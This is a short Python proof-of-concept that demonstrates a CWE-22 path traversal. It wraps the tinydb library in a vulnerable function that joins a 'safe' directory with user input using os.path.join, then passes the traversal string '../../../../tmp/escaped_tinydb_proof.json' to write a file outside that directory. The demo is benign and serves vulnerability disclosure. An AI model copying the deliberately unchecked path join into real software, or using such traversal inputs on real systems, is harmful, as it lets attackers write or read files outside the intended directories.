"""
Real, file-backed proof of the tinydb CWE-22 finding -- no harness, no
sandbox. Calls the REAL, installed tinydb library's REAL JSONStorage
__init__ / TinyDB() constructor (the exact function mined and confirmed
TRIGGERED: tinydb/storages.py:84, which internally reaches open(path)).

open_user_db() below is a small, realistic VULNERABLE wrapper -- the kind
of naive os.path.join() containment real apps rely on (incorrectly):
joining an "intended" safe directory with a user-controlled filename,
with no check that the result actually stays inside that directory.
os.path.join() happily lets "../" segments walk back out.

Run: python3 real_pathtraversal_demo.py
Then inspect the result yourself -- the proof file lands OUTSIDE app_data/.
"""
import os
from tinydb import TinyDB

SAFE_DIR = os.path.abspath("app_data")
os.makedirs(SAFE_DIR, exist_ok=True)


def open_user_db(filename):
    # VULNERABLE: naive join, no containment check after -- exactly how
    # real apps misuse a storage library with a user-controlled filename
    # (a "project name", a "report id", anything passed through raw).
    path = os.path.join(SAFE_DIR, filename)
    return TinyDB(path)


# Attacker-controlled "filename" that escapes the intended app_data/ dir.
attacker_input = "../../../../tmp/escaped_tinydb_proof.json"

print(f"Calling the REAL TinyDB()/JSONStorage via a realistic vulnerable wrapper with:\n  filename={attacker_input!r}\n")
db = open_user_db(attacker_input)
db.insert({"proof": "escaped the intended app_data/ directory via CWE-22"})

resolved = os.path.normpath(os.path.join(SAFE_DIR, attacker_input))
print(f"Real file written to: {resolved}")
print(f"Is it still inside the intended {SAFE_DIR}/ directory? {resolved.startswith(SAFE_DIR + os.sep)}")
print("Verify it yourself:")
print(f"  cat {resolved}")
